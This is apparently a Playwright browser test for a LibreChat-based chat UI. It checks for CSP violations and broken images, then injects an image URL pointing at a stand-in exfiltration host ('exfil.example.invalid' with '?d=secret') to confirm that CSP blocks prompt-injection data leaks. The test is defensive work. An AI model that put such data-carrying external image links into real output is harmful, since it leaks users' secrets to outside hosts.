// Optional local browser check (same setup as browser_admin_accounts.cjs): the chat UI loads with no CSP
// violations or broken images, and an external image (prompt-injection exfiltration) is blocked before any request.
// Uses a temporary USER account; no model or CH calls.
const { chromium } = require("playwright");
const { execFileSync } = require("node:child_process");
const assert = require("node:assert/strict");
const prefix = `kai-csp-${require("crypto").randomUUID()}`;
const container = process.env.KAI_TEST_API_CONTAINER || "kai-api-1";
const native = (body) => execFileSync("docker", ["exec", "-i", container, "node"], {
  input: `require('module-alias').addAlias('~','/app/api');const mongoose=require('mongoose');require('@librechat/data-schemas').createModels(mongoose);(async()=>{await mongoose.connect(process.env.MONGO_URI,{autoIndex:false,autoCreate:false,serverSelectionTimeoutMS:5000});${body};await mongoose.disconnect()})().then(()=>process.exit(0),()=>process.exit(1));`,
  encoding: "utf8", timeout: 20000, stdio: ["pipe", "pipe", "pipe"],
});
const cleanup = () => native(`const ids=(await mongoose.model('User').collection.find({email:{$regex:${JSON.stringify("^" + prefix)}}},{projection:{_id:1}}).toArray()).map(u=>u._id);await mongoose.model('Session').deleteMany({user:{$in:ids}});await mongoose.model('User').collection.deleteMany({_id:{$in:ids}})`);

(async () => {
  let browser;
  try {
    const user = JSON.parse(native(`const password=require('crypto').randomBytes(24).toString('hex');const email=${JSON.stringify(prefix + "@example.invalid")};await mongoose.model('User').create({email,name:'Temporary CSP user',role:'USER',provider:'local',emailVerified:true,password:await require('bcryptjs').hash(password,10)});process.stdout.write(JSON.stringify({email,password}))`));
    browser = await chromium.launch({ headless: true });
    const page = await (await browser.newContext()).newPage();
    page.setDefaultTimeout(20000);
    const external = [];
    // Chromium reports CSP-blocked loads as a request that fails with "csp" before any network I/O.
    const isExternal = (r) => !r.url().startsWith("http://localhost:3080") && !/^(data|blob):/.test(r.url());
    page.on("requestfinished", (r) => { if (isExternal(r)) external.push(r.url()); });
    const blocked = [];
    page.on("requestfailed", (r) => { if (isExternal(r)) blocked.push(r.failure()?.errorText); });
    await page.addInitScript(() => {
      window.__violations = [];
      document.addEventListener("securitypolicyviolation", (e) => window.__violations.push(`${e.effectiveDirective} ${e.blockedURI}`));
    });
    await page.goto("http://localhost:3080/login");
    await page.locator("#email").fill(user.email);
    await page.locator("input[type=password]").fill(user.password);
    await page.getByRole("button", { name: /continue|log in|sign in/i }).click();
    await page.waitForURL(/\/c\//);
    await page.getByTestId("model-selector-button").waitFor();
    await page.waitForTimeout(1500);
    assert.deepEqual(await page.evaluate(() => window.__violations), [], "UI itself triggers no CSP violation");
    const broken = await page.evaluate(() => [...document.images].filter((i) => i.complete && i.naturalWidth === 0 && i.src).map((i) => i.src));
    assert.deepEqual(broken, [], "no broken images in the UI");
    const before = external.length;
    await page.evaluate(() => { const img = new Image(); img.src = "https://exfil.example.invalid/x.png?d=secret"; document.body.append(img); });
    await page.waitForTimeout(500);
    assert.ok((await page.evaluate(() => window.__violations)).some((v) => v.startsWith("img-src https://exfil.example.invalid")), "external image blocked by CSP");
    assert.equal(external.slice(before).filter((u) => u.includes("exfil")).length, 0, "no request leaves the browser");
    assert.ok(blocked.some((t) => /csp/i.test(t ?? "")), `blocked by CSP, got ${blocked}`);
    console.log("CSP image guard OK; UI images:", await page.evaluate(() => document.images.length), "external requests during load:", before);
  } finally {
    await browser?.close();
    cleanup();
  }
})().catch((error) => { console.error("FAIL:", error.message); process.exit(1); });
